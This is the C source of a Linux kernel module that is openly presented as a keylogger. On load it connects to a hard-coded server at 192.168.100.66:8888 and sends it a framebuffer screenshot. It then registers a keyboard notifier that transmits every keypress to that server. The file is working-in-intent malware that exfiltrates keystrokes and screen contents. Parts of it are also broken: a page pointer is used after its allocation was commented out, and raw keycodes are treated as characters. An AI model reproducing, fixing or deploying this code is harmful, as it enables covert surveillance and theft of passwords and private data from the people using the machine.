#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/fb.h>

#define SERVER_IP "192.168.100.66"
#define SERVER_PORT 8888

MODULE_LICENSE("GPL");

struct socket *sock;

static int capture_screenshot(void)
{
    struct fb_info *fb_info;
    struct fb_var_screeninfo var_info;
    struct fb_fix_screeninfo fix_info;
    char *framebuffer;
    int x, y;

    // Get the framebuffer information
    fb_info = registered_fb[0];
    framebuffer = fb_info->screen_base;
    var_info = fb_info->var;
    fix_info = fb_info->fix;

    // Allocate memory for the screenshot
    char *screenshot = kmalloc(var_info.xres_virtual * var_info.yres_virtual * (var_info.bits_per_pixel / 8), GFP_KERNEL);
    if (!screenshot)
    {
        printk(KERN_ERR "Failed to allocate memory for screenshot\n");
        return -ENOMEM;
    }

    // Copy the framebuffer contents to the screenshot buffer
    for (y = 0; y < var_info.yres_virtual; y++)
    {
        memcpy(screenshot + y * var_info.xres_virtual * (var_info.bits_per_pixel / 8),
               framebuffer + y * fix_info.line_length,
               var_info.xres_virtual * (var_info.bits_per_pixel / 8));
    }

    // Send the screenshot via socket
    struct kvec vec;
    struct page *page;
    int size = var_info.xres_virtual * var_info.yres_virtual * (var_info.bits_per_pixel / 8);
    int written;

    // page = alloc_page(GFP_KERNEL);
    // if (!page)
    // {
    //     kfree(screenshot);
    //     printk(KERN_ERR "Failed to allocate page\n");
    //     return -ENOMEM;
    // }

    memcpy(page_address(page), screenshot, size);

    // Set up the kernel_sendpage parameters
    vec.iov_base = page_address(page);
    vec.iov_len = size;

    written = kernel_sendpage(sock, page, 1, size, 0);

    printk(KERN_INFO "Screenshot: %d bytes\n", written);

    __free_page(page);

    return written;
}

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE && param->down)
    {
        char key;

        // Convert keycode to character
        key = param->value;

        // Send the key through the socket
        if (sock)
        {
            struct kvec vec;
            struct page *page;
            int size;

            // Allocate a single page for the character
            page = alloc_page(GFP_KERNEL);
            if (!page)
            {
                printk(KERN_ERR "Failed to allocate page\n");
                return NOTIFY_OK;
            }

            // Copy the character to the page
            size = sizeof(char);
            memcpy(page_address(page), &key, size);

            // Set up the vector
            vec.iov_base = page_address(page);
            vec.iov_len = size;

            // Send the page
            kernel_sendpage(sock, page, 0, size, 0);

            printk(KERN_INFO "Keylogger: %c\n", key);

            // Free the page
            __free_page(page);
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify};

static int __init keylogger_init(void)
{
    struct sockaddr_in sin;
    int ret;

    // Create a socket
    ret = sock_create(AF_INET, SOCK_STREAM, 0, &sock);
    if (ret < 0)
    {
        printk(KERN_ERR "Failed to create socket\n");
        return ret;
    }

    // Set up the server address
    memset(&sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = in_aton(SERVER_IP);
    sin.sin_port = htons(SERVER_PORT);

    // Connect the socket to the server
    ret = sock->ops->connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in), 0);
    if (ret < 0)
    {
        printk(KERN_ERR "Failed to connect socket\n");
        sock_release(sock);
        return ret;
    }

    // Register the keylogger
    capture_screenshot();
    register_keyboard_notifier(&keylogger_nb);

    printk(KERN_INFO "Keylogger module initialized\n");

    return 0;
}

static void __exit keylogger_exit(void)
{
    // Unregister the keylogger
    unregister_keyboard_notifier(&keylogger_nb);

    // Disconnect and release the socket
    if (sock)
    {
        sock->ops->shutdown(sock, SHUT_RDWR);
        sock_release(sock);
    }

    printk(KERN_INFO "Keylogger module exited\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
